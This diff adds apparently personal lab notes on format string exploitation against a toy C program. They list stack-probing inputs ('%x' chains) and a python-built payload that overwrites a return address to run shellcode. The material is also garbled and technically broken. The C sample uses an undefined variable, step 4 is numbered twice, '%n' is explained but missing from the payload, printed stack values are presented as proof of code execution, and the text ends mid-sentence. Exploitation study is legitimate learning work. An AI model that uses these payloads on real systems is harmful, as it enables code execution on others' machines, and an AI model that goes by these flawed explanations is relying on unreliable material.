@@ -1,0 +1,106 @@
+Format String Exploition
+
+
+Methodology:
+
+Steps,
+
+1. Check for Format String Vulnerability.
+
+2. Locate user input on the stack.
+
+3. Create a padding to line up the last format specifier with last
+	4 bytes of user input. "(BBBB" , '%x ')
+
+4. Locate winning ret addr.
+
+4. Inject shellcode.
+
+
+
+
+
+
+
+
+
+int main(int argc, char **argv)
+{
+  vuln(argv[1]);
+
+  printf(input);
+}
+
+
+
+1. Input format specifiers into argument, check to see if a value on the
+	stack returns.
+===============================================================================
+
+#./test "AAAA%x %x %x %x"
+
+	a. "AAAA" = Allows us to locate where we are on the stack.
+
+	b. "%x %x %x %x" = These format specifiers allows you to view the stack
+
+
+
+Below are some format specifiers which can be used and their consequences:
+
+* "%x" Read data from the stack
+* "%s" Read character strings from the process' memory
+* "%n" Write an integer to locations in the process' memory
+
+
+2. Locate  User Input within the stack.
+===============================================================================
+
+#./ test "`python -c 'print "AAAA" + "%x " * 200'`"
+
+
+3. Prepare the stack to execute a arbitary memory address on the stack
+===============================================================================
+
+*add a padding after "BBBB" to help locate memory address to be executed.
+
+#./ test "`python -c 'print "AAAA" + "BBBB" + "CCCC" + "%x " * 200'`"
+
+
+a. Ensure the memory address at "BBBB" will be executed next.
+
+742f2e00 747365 41414141 565555b3 root@kali
+-------------------------^
+Return Address (Execute here)
+
+
+
+4. Exploit
+===============================================================================
+
+./test "`python -c 'print "AAAA" + "\xb3\x55\x55\x56" + "CCCCCCCCCCC" +  "%x " * 161 + "%x "'`"
+
+Args:
+
+a. "AAAA" = Inital user input ..
+
+b. "\xb3\x55\x55\x56" = Modified Return Address
+
+c. "CCCC" = Padding. This helps with located a proper place to execute 
+	return address.
+
+d. "%x " * 161 = Display 161 Memory Addresses on the stack.
+
+e. "%x " = Display Return Address
+
+f. "%n " = Input Return Address on stack. 
+
+
+
+Result:
+
+742f2e00 747365 41414141 565555b3 root@kali
+
+As you can see, after the "A" buffer we have inserted a memory address of
+a function that allows us to execute arbitrary code.
+
+After "565555b3" is read into memory
